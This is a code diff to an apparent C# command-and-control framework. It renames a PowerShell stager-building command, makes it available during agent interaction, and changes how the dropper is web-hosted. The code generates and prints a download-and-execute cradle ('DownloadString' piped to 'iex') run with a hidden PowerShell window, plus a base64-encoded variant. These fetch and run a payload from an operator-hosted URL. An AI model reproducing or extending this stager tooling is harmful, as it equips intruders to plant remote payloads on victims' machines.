@@ -9,10 +9,11 @@ using System.Threading.Tasks;
 using Commander.Internal;
 using System.IO;
 using System.Text.RegularExpressions;
+using Commander.Commands.Agent;
 
 namespace Commander.Commands.Laucher
 {
-    public class BuildPSDropperCommandCommandOptions
+    public class BuildPSDropperFromAgentCommandOptions
     {
         public string endpoint { get; set; }
         public string url { get; set; }
@@ -29,7 +30,7 @@ namespace Commander.Commands.Laucher
 
         public bool verbose { get; set; }
     }
-    public class BuildPSDropperCommand : EnhancedCommand<BuildPSDropperCommandCommandOptions>
+    public class BuildPSDropperFromAgentCommand : EnhancedCommand<BuildPSDropperFromAgentCommandOptions>
     {
 
 
@@ -37,7 +38,7 @@ namespace Commander.Commands.Laucher
         public override string Description => "Create a Powershell stager script";
         public override string Name => "ps-stager";
 
-        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;
+        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
 
         public override RootCommand Command => new RootCommand(this.Description)
         {
@@ -51,7 +52,7 @@ namespace Commander.Commands.Laucher
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
         };
 
-        protected override async Task<bool> HandleCommand(CommandContext<BuildPSDropperCommandCommandOptions> context)
+        protected override async Task<bool> HandleCommand(CommandContext<BuildPSDropperFromAgentCommandOptions> context)
         {
             var agent = context.Executor.CurrentAgent;
 
@@ -135,7 +136,8 @@ namespace Commander.Commands.Laucher
             if (context.Options.webhost)
             {
                 byte[] fileContent = Encoding.UTF8.GetBytes(script);
-                context.CommModule.WebHost(outFile, fileContent);
+                await WebHostCommand.PushFile(context, outFile, fileContent);
+
 
                 string scurl = $"{url}{outFile}";
                 context.Terminal.WriteLine($"[*] dropper hosted on : {scurl}");
@@ -143,8 +145,7 @@ namespace Commander.Commands.Laucher
                 context.Terminal.WriteLine($"[+] External Script : ");
 
                 string caller = $"(New-Object Net.WebClient).DownloadString('{scurl}') | iex";
-                if (urlProtocol == "https")
-                    caller = BuildStagerCommand.PowershellSSlScript + caller;
+
                 context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{caller}\"");
                 string caller64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(caller));
                 context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {caller64}");
